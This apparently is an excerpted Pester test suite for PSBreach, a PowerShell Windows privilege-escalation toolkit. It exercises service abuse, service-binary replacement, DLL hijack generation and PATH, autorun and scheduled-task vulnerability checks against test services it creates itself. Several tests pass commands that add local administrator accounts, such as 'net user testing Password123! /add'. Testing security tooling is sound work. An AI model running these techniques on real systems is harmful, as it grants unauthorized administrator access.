Import-Module -Force "..\PSBreach.ps1"
...
Describe 'Invoke-ServiceAbuse' {
    ...
    BeforeEach {
        $ServicePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())" + ".exe"
        $Null = sc.exe create "PSBreachService" binPath= $ServicePath
    }

    AfterEach {
        $Null = sc.exe delete "PSBreachService"
        $Null = $(net user john /delete >$Null 2>&1)
    }

    It 'Should abuse a vulnerable service to add a local administrator with default options.' {
        $Output = Invoke-ServiceAbuse -ServiceName "PSBreachService"
    ...
    It 'Should accept a service name on the pipeline.' {
        $Output = "PSBreachService" | Invoke-ServiceAbuse
        $Output.Command | Should Match "net"
    ...
    It 'Should accept custom user/password arguments.' {
        $Output = Invoke-ServiceAbuse -ServiceName "PSBreachService" -Username PSBreach -Password 'PASSword123!'
        $Output.Command | Should Match "net"

        if ( -not ($(net localgroup Administrators) -match "PSBreach")) {
            Throw "Local user 'PSBreach' not created."
        }
        $Null = $(net user PSBreach /delete >$Null 2>&1)
    }

    It 'Should accept a custom command.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Output = Invoke-ServiceAbuse -ServiceName "PSBreachService" -Command "net user testing Password123! /add"
...
Describe 'Install-ServiceBinary' {
    ...
    BeforeEach {
        $ServicePath = "$(Get-Location)\PSBreach.exe"
        $Null | Out-File -FilePath $ServicePath -Force
        $Null = sc.exe create "PSBreachService" binPath= $ServicePath
    }

    AfterEach {
        $Null = Invoke-ServiceStop -ServiceName PSBreachService
        $Null = sc.exe delete "PSBreachService"
        $Null = $(net user john /delete >$Null 2>&1)
        if (Test-Path "$(Get-Location)\PSBreach.exe") {
            Remove-Item -Path "$(Get-Location)\PSBreach.exe" -Force
        }
        if (Test-Path "$(Get-Location)\PSBreach.exe.bak") {
            Remove-Item -Path "$(Get-Location)\PSBreach.exe.bak" -Force
        }
    }

    It 'Should abuse a vulnerable service binary to add a local administrator with default options.' {

        $Output = Install-ServiceBinary -ServiceName "PSBreachService"
        $Output.Command | Should Match "net"

        $Null = Invoke-ServiceStart -ServiceName PSBreachService
        ...
        $Output = Restore-ServiceBinary -ServiceName PSBreachService
        "$(Get-Location)\PSBreach.exe.bak" | Should Not Exist
    }

    It 'Should accept a service name on the pipeline.' {

        $Output = "PSBreachService" | Install-ServiceBinary
        $Output.Command | Should Match "net"
    ...
    It 'Should accept custom user/password arguments.' {
        $Output = Install-ServiceBinary -ServiceName "PSBreachService" -Username PSBreach -Password 'PASSword123!'
        $Output.Command | Should Match "net"
    ...
    It 'Should accept a custom command.' {
        ...
        $Output = Install-ServiceBinary -ServiceName "PSBreachService" -Command "net user testing Password123! /add"
        $Output.Command | Should Match "net"
...
Describe 'Find-PathHijack' {
    ...
    It 'Should find a hijackable %PATH% folder.' {
        ...
        New-Item -Path C:\PSBreachTest\ -ItemType directory -Force

        $OldPath = $Env:PATH
        $Env:PATH += ';C:\PSBreachTest\'

        $Output = Find-PathHijack | Where-Object { $_.HijackablePath -like "*PSBreachTest*" }
        $Env:PATH = $OldPath
        $Output.HijackablePath | Should Be 'C:\PSBreachTest\'
    }
}
...
Describe 'Write-HijackDll' {
    ...
    It 'Should write a .dll that executes a custom command.' {
        ...
        Write-HijackDll -OutputFile "$(Get-Location)\PSBreach.dll" -Command "net user testing Password123! /add"
        
        "$(Get-Location)\PSBreach.dll" | Should Exist
        "$(Get-Location)\debug.bat" | Should Exist
        Remove-Item -Path "$(Get-Location)\PSBreach.dll" -Force
...
Describe 'Get-VulnAutoRun' {
    ...
    It 'Should find a vulnerable autorun.' {
        $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
        $Null | Out-File -FilePath $FilePath -Force
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PSBreach -Value "vuln.exe -i '$FilePath'"

        $Output = Get-VulnAutoRun | ? { $_.Path -like "*$FilePath*" }

        Remove-Item -Path $FilePath -Force
        $Null = Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PSBreach
...
Describe 'Get-VulnSchTask' {
    ...
    It 'Should find a vulnerable config file for a binary specified in a schtask.' {
        ...
        $Null = schtasks.exe /create /tn PSBreach /tr "vuln.exe -i '$FilePath'" /sc onstart /ru System /f

        $Output = Get-VulnSchTask | Where-Object { $_.TaskName -eq 'PSBreach' }
        $Null = schtasks.exe /delete /tn PSBreach /f
        Remove-Item -Path $FilePath -Force
